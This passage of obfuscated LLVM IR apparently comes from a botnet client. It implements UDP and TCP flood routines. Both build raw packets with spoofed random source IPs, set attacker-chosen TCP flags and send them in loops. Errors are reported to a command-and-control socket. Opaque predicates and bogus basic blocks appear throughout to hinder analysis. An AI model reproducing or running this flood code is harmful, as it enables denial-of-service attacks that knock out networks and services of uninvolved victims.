  %479 = icmp slt i32 %474, 10
  %480 = or i1 %478, %479
  br i1 %480, label %originalBB82, label %originalBB82alteredBB

originalBB82:                                     ; preds = %originalBB82alteredBB, %472
  %481 = load i32, i32* %40, align 4
  %482 = add i32 %481, 1
  store i32 %482, i32* %40, align 4
  %483 = load i32, i32* %41, align 4
  %484 = load i32, i32* %23, align 4
  %485 = icmp eq i32 %483, %484
  %486 = load i32, i32* @x.59
  %487 = load i32, i32* @y.60
  %488 = sub i32 %486, 1
  %489 = mul i32 %486, %488
  %490 = urem i32 %489, 2
  %491 = icmp eq i32 %490, 0
  %492 = icmp slt i32 %487, 10
  %493 = or i1 %491, %492
  br i1 %493, label %originalBBpart297, label %originalBB82alteredBB

originalBBpart297:                                ; preds = %originalBB82
  br i1 %485, label %494, label %498

; <label>:494:                                    ; preds = %originalBBpart297
  %495 = load i32, i32* %24, align 4
  %496 = mul nsw i32 %495, 1000
  %497 = call i32 @usleep(i32 %496)
  store i32 0, i32* %41, align 4
  br label %339

; <label>:498:                                    ; preds = %originalBBpart297
  %499 = load i32, i32* %41, align 4
  %500 = add i32 %499, 1
  store i32 %500, i32* %41, align 4
  br label %339

; <label>:501:                                    ; preds = %454
  %502 = load i32, i32* @x.59
  %503 = load i32, i32* @y.60
  %504 = sub i32 %502, 1
  %505 = mul i32 %502, %504
  %506 = urem i32 %505, 2
  %507 = icmp eq i32 %506, 0
  %508 = icmp slt i32 %503, 10
  %509 = or i1 %507, %508
  br i1 %509, label %originalBB99, label %originalBB99alteredBB

originalBB99:                                     ; preds = %originalBB99alteredBB, %501
  %510 = load i8*, i8** %36, align 8
  call void @llvm.stackrestore(i8* %510)
  %511 = load i32, i32* @x.59
  %512 = load i32, i32* @y.60
  %513 = sub i32 %511, 1
  %514 = mul i32 %511, %513
  %515 = urem i32 %514, 2
  %516 = icmp eq i32 %515, 0
  %517 = icmp slt i32 %512, 10
  %518 = or i1 %516, %517
  br i1 %518, label %originalBBpart2101, label %originalBB99alteredBB

originalBBpart2101:                               ; preds = %originalBB99
  br label %519

; <label>:519:                                    ; preds = %originalBBpart2101, %196, %originalBBpart223, %167, %88, %78, %67
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %8
  %520 = alloca i8*, align 8
  %521 = alloca i32, align 4
  %522 = alloca i32, align 4
  %523 = alloca i32, align 4
  %524 = alloca i32, align 4
  %525 = alloca i32, align 4
  %526 = alloca i32, align 4
  %527 = alloca i32, align 4
  %528 = alloca %struct.sockaddr_in, align 4
  %529 = alloca i32, align 4
  %530 = alloca i32, align 4
  %531 = alloca i8*, align 8
  %532 = alloca i32, align 4
  %533 = alloca i32, align 4
  %534 = alloca i32, align 4
  %535 = alloca i32, align 4
  %536 = alloca i32, align 4
  %537 = alloca i32, align 4
  %538 = alloca i32, align 4
  %539 = alloca i8*, align 8
  %540 = alloca %struct.iphdr*, align 8
  %541 = alloca %struct.udphdr*, align 8
  %542 = alloca i32, align 4
  %543 = alloca i32, align 4
  %544 = alloca i32, align 4
  store i8* %0, i8** %520, align 8
  store i32 %1, i32* %521, align 4
  store i32 %2, i32* %522, align 4
  store i32 %3, i32* %523, align 4
  store i32 %4, i32* %524, align 4
  store i32 %5, i32* %525, align 4
  store i32 %6, i32* %526, align 4
  store i32 %7, i32* %527, align 4
  %545 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %528, i32 0, i32 0
  store i16 2, i16* %545, align 4
  %546 = load i32, i32* %521, align 4
  %547 = icmp eq i32 %546, 0
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %89
  %548 = load i8*, i8** %28, align 8
  %549 = load i32, i32* %21, align 4
  %_ = shl i32 %549, 1
  %_2 = sub i32 %549, 1
  %gen = mul i32 %_2, 1
  %_3 = shl i32 %549, 1
  %_4 = sub i32 %549, 1
  %gen5 = mul i32 %_4, 1
  %_6 = sub i32 0, %549
  %gen7 = add i32 %_6, 1
  %550 = add nsw i32 %549, 1
  %551 = sext i32 %550 to i64
  call void @llvm.memset.p0i8.i64(i8* %548, i8 0, i64 %551, i32 1, i1 false)
  %552 = load i8*, i8** %28, align 8
  %553 = load i32, i32* %21, align 4
  call void @makeRandomStr(i8* %552, i32 %553)
  %554 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %555 = load i32, i32* %19, align 4
  %_8 = shl i32 %554, %555
  %_9 = shl i32 %554, %555
  %_10 = sub i32 %554, %555
  %gen11 = mul i32 %_10, %555
  %_12 = shl i32 %554, %555
  %_13 = shl i32 %554, %555
  %556 = add nsw i32 %554, %555
  store i32 %556, i32* %29, align 4
  store i32 0, i32* %30, align 4
  store i32 0, i32* %31, align 4
  br label %originalBB1

originalBB17alteredBB:                            ; preds = %originalBB17, %125
  %557 = load i32, i32* %18, align 4
  %558 = icmp eq i32 %557, 0
  br label %originalBB17

originalBB21alteredBB:                            ; preds = %originalBB21, %172
  %559 = load i32, i32* @mainCommSock, align 4
  %560 = call i32 (i32, i8*, ...) @sockprintf(i32 %559, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.73, i32 0, i32 0))
  br label %originalBB21

originalBB25alteredBB:                            ; preds = %originalBB25, %204
  %561 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %562 = call i32 @rand_cmwc()
  %_26 = shl i32 %561, %562
  %_27 = shl i32 %561, %562
  %_28 = sub i32 %561, %562
  %gen29 = mul i32 %_28, %562
  %563 = xor i32 %561, %562
  call void @srand(i32 %563) #2
  %564 = call i32 @rand() #2
  call void @init_rand(i32 %564)
  br label %originalBB25

originalBB33alteredBB:                            ; preds = %originalBB33, %225
  %565 = load i32, i32* %20, align 4
  %566 = icmp eq i32 %565, 0
  br label %originalBB33

originalBB37alteredBB:                            ; preds = %originalBB37, %251
  %567 = load i32, i32* %21, align 4
  %568 = sext i32 %567 to i64
  %_38 = sub i64 28, %568
  %gen39 = mul i64 %_38, %568
  %_40 = shl i64 28, %568
  %_41 = shl i64 28, %568
  %_42 = sub i64 0, 28
  %gen43 = add i64 %_42, %568
  %_44 = sub i64 28, %568
  %gen45 = mul i64 %_44, %568
  %569 = add i64 28, %568
  %570 = call i8* @llvm.stacksave()
  store i8* %570, i8** %36, align 8
  %571 = alloca i8, i64 %569, align 16
  %572 = bitcast i8* %571 to %struct.iphdr*
  store %struct.iphdr* %572, %struct.iphdr** %37, align 8
  %573 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %574 = bitcast %struct.iphdr* %573 to i8*
  %575 = getelementptr i8, i8* %574, i64 20
  %576 = bitcast i8* %575 to %struct.udphdr*
  store %struct.udphdr* %576, %struct.udphdr** %38, align 8
  %577 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %578 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %25, i32 0, i32 2
  %579 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %578, i32 0, i32 0
  %580 = load i32, i32* %579, align 4
  %581 = load i32, i32* %35, align 4
  %582 = call i32 @GetRandomIP(i32 %581)
  %583 = call i32 @htonl(i32 %582) #13
  %584 = load i32, i32* %21, align 4
  %585 = sext i32 %584 to i64
  %_46 = sub i64 8, %585
  %gen47 = mul i64 %_46, %585
  %586 = add i64 8, %585
  %587 = trunc i64 %586 to i32
  call void @makeIPPacket(%struct.iphdr* %577, i32 %580, i32 %583, i8 zeroext 17, i32 %587)
  %588 = load i32, i32* %21, align 4
  %589 = sext i32 %588 to i64
  %_48 = sub i64 8, %589
  %gen49 = mul i64 %_48, %589
  %_50 = sub i64 0, 8
  %gen51 = add i64 %_50, %589
  %_52 = shl i64 8, %589
  %_53 = sub i64 0, 8
  %gen54 = add i64 %_53, %589
  %_55 = sub i64 0, 8
  %gen56 = add i64 %_55, %589
  %_57 = sub i64 0, 8
  %gen58 = add i64 %_57, %589
  %590 = add i64 8, %589
  %591 = trunc i64 %590 to i16
  %592 = call zeroext i16 @htons(i16 zeroext %591) #13
  %593 = load %struct.udphdr*, %struct.udphdr** %38, align 8
  %594 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %593, i32 0, i32 0
  %595 = bitcast %union.anon.3* %594 to %struct.anon.4*
  %596 = getelementptr inbounds %struct.anon.4, %struct.anon.4* %595, i32 0, i32 2
  store i16 %592, i16* %596, align 2
  %597 = call i32 @rand_cmwc()
  %598 = trunc i32 %597 to i16
  %599 = load %struct.udphdr*, %struct.udphdr** %38, align 8
  %600 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %599, i32 0, i32 0
  %601 = bitcast %union.anon.3* %600 to %struct.anon.4*
  %602 = getelementptr inbounds %struct.anon.4, %struct.anon.4* %601, i32 0, i32 0
  store i16 %598, i16* %602, align 2
  %603 = load i32, i32* %18, align 4
  %604 = icmp eq i32 %603, 0
  br label %originalBB37

originalBB62alteredBB:                            ; preds = %originalBB62, %339
  br label %originalBB62

originalBB66alteredBB:                            ; preds = %originalBB66, %356
  %605 = load i32, i32* %32, align 4
  %606 = bitcast %struct.sockaddr_in* %25 to %struct.sockaddr*
  %607 = call i64 @sendto(i32 %605, i8* %264, i64 %262, i32 0, %struct.sockaddr* %606, i32 16)
  %608 = call i32 @rand_cmwc()
  %609 = trunc i32 %608 to i16
  %610 = load %struct.udphdr*, %struct.udphdr** %38, align 8
  %611 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %610, i32 0, i32 0
  %612 = bitcast %union.anon.3* %611 to %struct.anon.4*
  %613 = getelementptr inbounds %struct.anon.4, %struct.anon.4* %612, i32 0, i32 0
  store i16 %609, i16* %613, align 2
  %614 = load i32, i32* %18, align 4
  %615 = icmp eq i32 %614, 0
  br label %originalBB66

originalBB70alteredBB:                            ; preds = %originalBB70, %384
  %616 = call i32 @rand_cmwc()
  br label %originalBB70

originalBB74alteredBB:                            ; preds = %originalBB74, %407
  %617 = trunc i32 %408 to i16
  %618 = load %struct.udphdr*, %struct.udphdr** %38, align 8
  %619 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %618, i32 0, i32 0
  %620 = bitcast %union.anon.3* %619 to %struct.anon.4*
  %621 = getelementptr inbounds %struct.anon.4, %struct.anon.4* %620, i32 0, i32 1
  store i16 %617, i16* %621, align 2
  %622 = call i32 @rand_cmwc()
  %623 = trunc i32 %622 to i16
  %624 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %625 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %624, i32 0, i32 3
  store i16 %623, i16* %625, align 4
  %626 = load i32, i32* %35, align 4
  %627 = call i32 @GetRandomIP(i32 %626)
  %628 = call i32 @htonl(i32 %627) #13
  %629 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %630 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %629, i32 0, i32 8
  store i32 %628, i32* %630, align 4
  %631 = bitcast i8* %264 to i16*
  %632 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %633 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %632, i32 0, i32 2
  %634 = load i16, i16* %633, align 2
  %635 = zext i16 %634 to i32
  %636 = call zeroext i16 @csum(i16* %631, i32 %635)
  %637 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %638 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %637, i32 0, i32 7
  store i16 %636, i16* %638, align 2
  %639 = load i32, i32* %40, align 4
  %640 = load i32, i32* %26, align 4
  %641 = icmp eq i32 %639, %640
  br label %originalBB74

originalBB78alteredBB:                            ; preds = %originalBB78, %455
  store i32 0, i32* %40, align 4
  br label %originalBB78

originalBB82alteredBB:                            ; preds = %originalBB82, %472
  %642 = load i32, i32* %40, align 4
  %_83 = sub i32 %642, 1
  %gen84 = mul i32 %_83, 1
  %_85 = sub i32 %642, 1
  %gen86 = mul i32 %_85, 1
  %_87 = shl i32 %642, 1
  %_88 = sub i32 %642, 1
  %gen89 = mul i32 %_88, 1
  %_90 = sub i32 %642, 1
  %gen91 = mul i32 %_90, 1
  %_92 = sub i32 %642, 1
  %gen93 = mul i32 %_92, 1
  %_94 = sub i32 0, %642
  %gen95 = add i32 %_94, 1
  %643 = add i32 %642, 1
  store i32 %643, i32* %40, align 4
  %644 = load i32, i32* %41, align 4
  %645 = load i32, i32* %23, align 4
  %646 = icmp eq i32 %644, %645
  br label %originalBB82

originalBB99alteredBB:                            ; preds = %originalBB99, %501
  %647 = load i8*, i8** %36, align 8
  call void @llvm.stackrestore(i8* %647)
  br label %originalBB99
}

declare i64 @sendto(i32, i8*, i64, i32, %struct.sockaddr*, i32) #3

declare i32 @usleep(i32) #3

; Function Attrs: nounwind
declare void @srand(i32) #4

; Function Attrs: nounwind readnone
declare i32 @htonl(i32) #8

; Function Attrs: noinline nounwind uwtable
define void @sendTCP(i8*, i32, i32, i32, i8*, i32, i32) #0 {
  %8 = load i32, i32* @x.61
  %9 = load i32, i32* @y.62
  %10 = sub i32 %8, 1
  %11 = mul i32 %8, %10
  %12 = urem i32 %11, 2
  %13 = icmp eq i32 %12, 0
  %14 = icmp slt i32 %9, 10
  %15 = or i1 %13, %14
  br i1 %15, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %7
  %16 = alloca i8*, align 8
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i8*, align 8
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca i32, align 4
  %24 = alloca %struct.sockaddr_in, align 4
  %25 = alloca i32, align 4
  %26 = alloca i32, align 4
  %27 = alloca i32, align 4
  %28 = alloca i8*, align 8
  %29 = alloca %struct.iphdr*, align 8
  %30 = alloca %struct.tcphdr*, align 8
  %31 = alloca i8*, align 8
  %32 = alloca i32, align 4
  %33 = alloca i32, align 4
  store i8* %0, i8** %16, align 8
  store i32 %1, i32* %17, align 4
  store i32 %2, i32* %18, align 4
  store i32 %3, i32* %19, align 4
  store i8* %4, i8** %20, align 8
  store i32 %5, i32* %21, align 4
  store i32 %6, i32* %22, align 4
  %34 = load i32, i32* %22, align 4
  store i32 %34, i32* %23, align 4
  %35 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %24, i32 0, i32 0
  store i16 2, i16* %35, align 4
  %36 = load i32, i32* %17, align 4
  %37 = icmp eq i32 %36, 0
  %38 = load i32, i32* @x.61
  %39 = load i32, i32* @y.62
  %40 = sub i32 %38, 1
  %41 = mul i32 %38, %40
  %42 = urem i32 %41, 2
  %43 = icmp eq i32 %42, 0
  %44 = icmp slt i32 %39, 10
  %45 = or i1 %43, %44
  br i1 %45, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %37, label %46, label %66

; <label>:46:                                     ; preds = %originalBBpart2
  %47 = load i32, i32* @x.61
  %48 = load i32, i32* @y.62
  %49 = sub i32 %47, 1
  %50 = mul i32 %47, %49
  %51 = urem i32 %50, 2
  %52 = icmp eq i32 %51, 0
  %53 = icmp slt i32 %48, 10
  %54 = or i1 %52, %53
  br i1 %54, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %46
  %55 = call i32 @rand_cmwc()
  %56 = trunc i32 %55 to i16
  %57 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %24, i32 0, i32 1
  store i16 %56, i16* %57, align 2
  %58 = load i32, i32* @x.61
  %59 = load i32, i32* @y.62
  %60 = sub i32 %58, 1
  %61 = mul i32 %58, %60
  %62 = urem i32 %61, 2
  %63 = icmp eq i32 %62, 0
  %64 = icmp slt i32 %59, 10
  %65 = or i1 %63, %64
  br i1 %65, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %71

; <label>:66:                                     ; preds = %originalBBpart2
  %67 = load i32, i32* %17, align 4
  %68 = trunc i32 %67 to i16
  %69 = call zeroext i16 @htons(i16 zeroext %68) #13
  %70 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %24, i32 0, i32 1
  store i16 %69, i16* %70, align 2
  br label %71

; <label>:71:                                     ; preds = %66, %originalBBpart24
  %72 = load i8*, i8** %16, align 8
  %73 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %24, i32 0, i32 2
  %74 = call i32 @getHost(i8* %72, %struct.in_addr* %73)
  %75 = icmp ne i32 %74, 0
  br i1 %75, label %76, label %77

; <label>:76:                                     ; preds = %71
  br label %531

; <label>:77:                                     ; preds = %71
  %78 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %24, i32 0, i32 3
  %79 = getelementptr inbounds [8 x i8], [8 x i8]* %78, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %79, i8 0, i64 8, i32 4, i1 false)
  %80 = call i32 @socket(i32 2, i32 3, i32 6) #2
  store i32 %80, i32* %25, align 4
  %81 = load i32, i32* %25, align 4
  %82 = icmp ne i32 %81, 0
  br i1 %82, label %86, label %83

; <label>:83:                                     ; preds = %77
  %84 = load i32, i32* @mainCommSock, align 4
  %85 = call i32 (i32, i8*, ...) @sockprintf(i32 %84, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.73, i32 0, i32 0))
  br label %531

; <label>:86:                                     ; preds = %77
  %87 = load i32, i32* @x.61
  %88 = load i32, i32* @y.62
  %89 = sub i32 %87, 1
  %90 = mul i32 %87, %89
  %91 = urem i32 %90, 2
  %92 = icmp eq i32 %91, 0
  %93 = icmp slt i32 %88, 10
  %94 = or i1 %92, %93
  br i1 %94, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %86
  store i32 1, i32* %26, align 4
  %95 = load i32, i32* %25, align 4
  %96 = bitcast i32* %26 to i8*
  %97 = call i32 @setsockopt(i32 %95, i32 0, i32 3, i8* %96, i32 4) #2
  %98 = icmp slt i32 %97, 0
  %99 = load i32, i32* @x.61
  %100 = load i32, i32* @y.62
  %101 = sub i32 %99, 1
  %102 = mul i32 %99, %101
  %103 = urem i32 %102, 2
  %104 = icmp eq i32 %103, 0
  %105 = icmp slt i32 %100, 10
  %106 = or i1 %104, %105
  br i1 %106, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %98, label %107, label %126

; <label>:107:                                    ; preds = %originalBBpart28
  %108 = load i32, i32* @x.61
  %109 = load i32, i32* @y.62
  %110 = sub i32 %108, 1
  %111 = mul i32 %108, %110
  %112 = urem i32 %111, 2
  %113 = icmp eq i32 %112, 0
  %114 = icmp slt i32 %109, 10
  %115 = or i1 %113, %114
  br i1 %115, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %107
  %116 = load i32, i32* @mainCommSock, align 4
  %117 = call i32 (i32, i8*, ...) @sockprintf(i32 %116, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.74, i32 0, i32 0))
  %118 = load i32, i32* @x.61
  %119 = load i32, i32* @y.62
  %120 = sub i32 %118, 1
  %121 = mul i32 %118, %120
  %122 = urem i32 %121, 2
  %123 = icmp eq i32 %122, 0
  %124 = icmp slt i32 %119, 10
  %125 = or i1 %123, %124
  br i1 %125, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br label %531

; <label>:126:                                    ; preds = %originalBBpart28
  %127 = load i32, i32* @x.61
  %128 = load i32, i32* @y.62
  %129 = sub i32 %127, 1
  %130 = mul i32 %127, %129
  %131 = urem i32 %130, 2
  %132 = icmp eq i32 %131, 0
  %133 = icmp slt i32 %128, 10
  %134 = or i1 %132, %133
  br i1 %134, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %126
  %135 = load i32, i32* %19, align 4
  %136 = icmp eq i32 %135, 0
  %137 = load i32, i32* @x.61
  %138 = load i32, i32* @y.62
  %139 = sub i32 %137, 1
  %140 = mul i32 %137, %139
  %141 = urem i32 %140, 2
  %142 = icmp eq i32 %141, 0
  %143 = icmp slt i32 %138, 10
  %144 = or i1 %142, %143
  br i1 %144, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br i1 %136, label %145, label %162

; <label>:145:                                    ; preds = %originalBBpart216
  %146 = load i32, i32* @x.61
  %147 = load i32, i32* @y.62
  %148 = sub i32 %146, 1
  %149 = mul i32 %146, %148
  %150 = urem i32 %149, 2
  %151 = icmp eq i32 %150, 0
  %152 = icmp slt i32 %147, 10
  %153 = or i1 %151, %152
  br i1 %153, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %145
  store i32 0, i32* %27, align 4
  %154 = load i32, i32* @x.61
  %155 = load i32, i32* @y.62
  %156 = sub i32 %154, 1
  %157 = mul i32 %154, %156
  %158 = urem i32 %157, 2
  %159 = icmp eq i32 %158, 0
  %160 = icmp slt i32 %155, 10
  %161 = or i1 %159, %160
  br i1 %161, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br label %168

; <label>:162:                                    ; preds = %originalBBpart216
  %163 = load i32, i32* %19, align 4
  %164 = sub nsw i32 32, %163
  %165 = shl i32 1, %164
  %166 = sub nsw i32 %165, 1
  %167 = xor i32 %166, -1
  store i32 %167, i32* %27, align 4
  br label %168

; <label>:168:                                    ; preds = %162, %originalBBpart220
  %169 = load i32, i32* %21, align 4
  %170 = sext i32 %169 to i64
  %171 = add i64 40, %170
  %172 = call i8* @llvm.stacksave()
  store i8* %172, i8** %28, align 8
  %173 = alloca i8, i64 %171, align 16
  %174 = bitcast i8* %173 to %struct.iphdr*
  store %struct.iphdr* %174, %struct.iphdr** %29, align 8
  %175 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %176 = bitcast %struct.iphdr* %175 to i8*
  %177 = getelementptr i8, i8* %176, i64 20
  %178 = bitcast i8* %177 to %struct.tcphdr*
  store %struct.tcphdr* %178, %struct.tcphdr** %30, align 8
  %179 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %180 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %24, i32 0, i32 2
  %181 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %180, i32 0, i32 0
  %182 = load i32, i32* %181, align 4
  %183 = load i32, i32* %27, align 4
  %184 = call i32 @GetRandomIP(i32 %183)
  %185 = call i32 @htonl(i32 %184) #13
  %186 = load i32, i32* %21, align 4
  %187 = sext i32 %186 to i64
  %188 = add i64 20, %187
  %189 = trunc i64 %188 to i32
  call void @makeIPPacket(%struct.iphdr* %179, i32 %182, i32 %185, i8 zeroext 6, i32 %189)
  %190 = call i32 @rand_cmwc()
  %191 = trunc i32 %190 to i16
  %192 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %193 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %192, i32 0, i32 0
  %194 = bitcast %union.anon.0* %193 to %struct.anon.1*
  %195 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %194, i32 0, i32 0
  store i16 %191, i16* %195, align 4
  %196 = call i32 @rand_cmwc()
  %197 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %198 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %197, i32 0, i32 0
  %199 = bitcast %union.anon.0* %198 to %struct.anon.1*
  %200 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %199, i32 0, i32 2
  store i32 %196, i32* %200, align 4
  %201 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %202 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %201, i32 0, i32 0
  %203 = bitcast %union.anon.0* %202 to %struct.anon.1*
  %204 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %203, i32 0, i32 3
  store i32 0, i32* %204, align 4
  %205 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %206 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %205, i32 0, i32 0
  %207 = bitcast %union.anon.0* %206 to %struct.anon.1*
  %208 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %207, i32 0, i32 4
  %209 = load i16, i16* %208, align 4
  %210 = and i16 %209, -241
  %211 = or i16 %210, 80
  store i16 %211, i16* %208, align 4
  %212 = load i8*, i8** %20, align 8
  %213 = call i32 @strcmp(i8* %212, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.75, i32 0, i32 0)) #10
  %214 = icmp ne i32 %213, 0
  br i1 %214, label %251, label %215

; <label>:215:                                    ; preds = %168
  %216 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %217 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %216, i32 0, i32 0
  %218 = bitcast %union.anon.0* %217 to %struct.anon.1*
  %219 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %218, i32 0, i32 4
  %220 = load i16, i16* %219, align 4
  %221 = and i16 %220, -513
  %222 = or i16 %221, 512
  store i16 %222, i16* %219, align 4
  %223 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %224 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %223, i32 0, i32 0
  %225 = bitcast %union.anon.0* %224 to %struct.anon.1*
  %226 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %225, i32 0, i32 4
  %227 = load i16, i16* %226, align 4
  %228 = and i16 %227, -1025
  %229 = or i16 %228, 1024
  store i16 %229, i16* %226, align 4
  %230 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %231 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %230, i32 0, i32 0
  %232 = bitcast %union.anon.0* %231 to %struct.anon.1*
  %233 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %232, i32 0, i32 4
  %234 = load i16, i16* %233, align 4
  %235 = and i16 %234, -257
  %236 = or i16 %235, 256
  store i16 %236, i16* %233, align 4
  %237 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %238 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %237, i32 0, i32 0
  %239 = bitcast %union.anon.0* %238 to %struct.anon.1*
  %240 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %239, i32 0, i32 4
  %241 = load i16, i16* %240, align 4
  %242 = and i16 %241, -4097
  %243 = or i16 %242, 4096
  store i16 %243, i16* %240, align 4
  %244 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %245 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %244, i32 0, i32 0
  %246 = bitcast %union.anon.0* %245 to %struct.anon.1*
  %247 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %246, i32 0, i32 4
  %248 = load i16, i16* %247, align 4
  %249 = and i16 %248, -2049
  %250 = or i16 %249, 2048
  store i16 %250, i16* %247, align 4
  br label %392

; <label>:251:                                    ; preds = %168
  %252 = load i8*, i8** %20, align 8
  %253 = call i8* @strtok(i8* %252, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.76, i32 0, i32 0)) #2
  store i8* %253, i8** %31, align 8
  br label %254

; <label>:254:                                    ; preds = %originalBBpart236, %251
  %255 = load i32, i32* @x.61
  %256 = load i32, i32* @y.62
  %257 = sub i32 %255, 1
  %258 = mul i32 %255, %257
  %259 = urem i32 %258, 2
  %260 = icmp eq i32 %259, 0
  %261 = icmp slt i32 %256, 10
  %262 = or i1 %260, %261
  br i1 %262, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %254
  %263 = load i8*, i8** %31, align 8
  %264 = icmp ne i8* %263, null
  %265 = load i32, i32* @x.61
  %266 = load i32, i32* @y.62
  %267 = sub i32 %265, 1
  %268 = mul i32 %265, %267
  %269 = urem i32 %268, 2
  %270 = icmp eq i32 %269, 0
  %271 = icmp slt i32 %266, 10
  %272 = or i1 %270, %271
  br i1 %272, label %originalBBpart224, label %originalBB22alteredBB

originalBBpart224:                                ; preds = %originalBB22
  br i1 %264, label %273, label %391

; <label>:273:                                    ; preds = %originalBBpart224
  %274 = load i8*, i8** %31, align 8
  %275 = call i32 @strcmp(i8* %274, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.77, i32 0, i32 0)) #10
  %276 = icmp ne i32 %275, 0
  br i1 %276, label %285, label %277

; <label>:277:                                    ; preds = %273
  %278 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %279 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %278, i32 0, i32 0
  %280 = bitcast %union.anon.0* %279 to %struct.anon.1*
  %281 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %280, i32 0, i32 4
  %282 = load i16, i16* %281, align 4
  %283 = and i16 %282, -513
  %284 = or i16 %283, 512
  store i16 %284, i16* %281, align 4
  br label %373

; <label>:285:                                    ; preds = %273
  %286 = load i8*, i8** %31, align 8
  %287 = call i32 @strcmp(i8* %286, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.78, i32 0, i32 0)) #10
  %288 = icmp ne i32 %287, 0
  br i1 %288, label %297, label %289

; <label>:289:                                    ; preds = %285
  %290 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %291 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %290, i32 0, i32 0
  %292 = bitcast %union.anon.0* %291 to %struct.anon.1*
  %293 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %292, i32 0, i32 4
  %294 = load i16, i16* %293, align 4
  %295 = and i16 %294, -1025
  %296 = or i16 %295, 1024
  store i16 %296, i16* %293, align 4
  br label %372

; <label>:297:                                    ; preds = %285
  %298 = load i8*, i8** %31, align 8
